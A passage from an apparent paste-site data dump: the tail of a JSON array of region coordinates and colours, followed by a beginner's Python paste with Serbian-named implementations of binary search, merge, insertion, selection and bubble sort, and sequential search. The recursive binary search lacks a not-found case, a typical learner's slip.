gionId"":9272,""regionX"":46,""regionY"":36,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":46,""regionY"":37,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":47,""regionY"":37,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":48,""regionY"":37,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":49,""regionY"":37,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":49,""regionY"":38,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":49,""regionY"":39,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":49,""regionY"":40,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":50,""regionY"":40,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":50,""regionY"":41,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":51,""regionY"":41,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":52,""regionY"":41,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":55,""regionY"":41,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":56,""regionY"":41,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":54,""regionY"":41,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":53,""regionY"":41,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":52,""regionY"":40,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":52,""regionY"":37,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":52,""regionY"":38,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":52,""regionY"":39,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":59,""regionY"":34,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":59,""regionY"":33,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":59,""regionY"":35,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":59,""regionY"":36,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":59,""regionY"":37,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":59,""regionY"":38,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":58,""regionY"":38,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":57,""regionY"":38,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":57,""regionY"":39,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":57,""regionY"":40,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":57,""regionY"":41,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":56,""regionY"":34,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":53,""regionY"":37,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":53,""regionY"":36,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":53,""regionY"":31,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":52,""regionY"":31,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":51,""regionY"":31,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":50,""regionY"":31,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":49,""regionY"":31,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":48,""regionY"":31,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":48,""regionY"":32,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":48,""regionY"":33,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":47,""regionY"":34,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":48,""regionY"":34,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":44,""regionY"":28,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":58,""regionY"":17,""z"":0,""color"":""#01FFFFFF""},{""regionId"":9272,""regionX"":58,""regionY"":18,""z"":0,""color"":""#01FFFFFF""}]"
x1BddBH0,struk,bob3322,Python,Saturday 23rd of March 2024 05:33:21 PM CDT,"def binarnaPretraga(list, trazi): 
    pocetak = 0 
    kraj = len(list) - 1 
    srednji = 0 
    while pocetak <= kraj: 
        srednji = (pocetak + kraj) // 2 
        if list[srednji] < trazi: 
            pocetak = srednji + 1 
        elif list[srednji] > trazi: 
            kraj = srednji - 1
        else: 
            return srednji 
    return -1
list = [1,2,3,4,5,6,7]
trazi = 2 
rezultat = binarnaPretraga(list, trazi) 
print(f""Broj se nalazi na indeksu {rezultat}"")

///////////////////////////////////////////////////////////////////////////////

def binarnaPretragaRekurzivno(list,pocetak,kraj,trazeniBroj): 
    
    sredina = (pocetak + kraj)//2 
    
    if list[sredina] == trazeniBroj: 
        return sredina 
    elif list[sredina] > trazeniBroj: 
        return binarnaPretragaRekurzivno(list,pocetak,sredina - 1,trazeniBroj) 
    else: 
        return binarnaPretragaRekurzivno(list,sredina + 1,kraj,trazeniBroj) 
    

list = [1,2,3,4,5,6,7]
trazeniBroj = 3 
rezultat = binarnaPretragaRekurzivno(list,0,len(list) - 1,trazeniBroj)
print(f""Broj se nalazi na indeksu {rezultat}  "")

///////////////////////////////////////////////////////////////////////////////

def mergeSort(lista): 
    if len(lista) > 1: 
        leva_strana = lista[:len(lista)//2] 
        desna_strana = lista[len(lista)//2:] 
        
        mergeSort(leva_strana) 
        mergeSort(desna_strana) 
        merge(leva_strana,desna_strana,lista)

def merge(leva_strana, desna_strana, lista): 
    i = j = k = 0 
    
    while i < len(leva_strana) and j < len(desna_strana): 
        if leva_strana[i] <= desna_strana[j]: 
            lista[k] = leva_strana[i] 
            i += 1 
        else: 
            lista[k] = desna_strana[j] 
            j += 1 
        k += 1 
        
    while i < len(leva_strana): 
        lista[k] = leva_strana[i] 
        i += 1 
        k += 1 
    while j < len(desna_strana): 
        lista[k] = desna_strana[j] 
        j += 1 
        k += 1


lista = [12,5,18,16,3,7,20,14] 
print(""Ne sortirana lista"" ,lista) 
mergeSort(lista) 
print(""Sortirana lista "",lista) 

///////////////////////////////////////////////////////////////////////////////

def insertSort(lista): 
    duzina_liste = len(lista) 
    for i in range(1, duzina_liste): 
        kljuc = lista[i] 
        j = i - 1  
        while j >= 0 and lista[j] > kljuc: 
            lista[j + 1] = lista[j] 
            j -= 1 
            
        lista[j + 1] = kljuc      

lista = [42,38,12,5,78,64,52,37] 
print(""Ne sortitaran lista"",lista)  
insertSort(lista) 
print(""Sortirana lista"",lista) 

///////////////////////////////////////////////////////////////////////////////

def sekvencijalnaPretraga(list,trazi): 
    
    for i in range(len(list)): 
        if list[i] == trazi: 
            return print(f""trazni broj je na {i} indeksu"") 
    return -1

print(sekvencijalnaPretraga([5,4,3,2,1],1))

///////////////////////////////////////////////////////////////////////////////

def selection_sort(lista): 
    duzina_liste = len(lista) 
    for i in range(duzina_liste):
        min_index = i 
        for j in range(i + 1,duzina_liste): 
            if lista[j] < lista[min_index]: 
                min_index = j 
        lista[i],lista[min_index] = lista[min_index],lista[i]

lista = [57,15,45,66,35,78,20] 
print(""Ne sortirana lista"",lista)   
selection_sort(lista) 
print(""Sortirana lista"",lista)

///////////////////////////////////////////////////////////////////////////////

def bubblesort(lista):
    for n in range(len(lista)-1, 0, -1):
        zamenjen = False
        for i in range(n):
            if lista[i] > lista[i + 1]:
                zamenjen = True
                lista[i], lista[i + 1] = lista[i + 1],lista[i]
        if not zamenjen:
            return

lista = [14,23,74,59,67,97]

print(""Ne sortirana lista,"",lista)
bubblesort(lista)
print(""Sortirana lista, "",lista)"
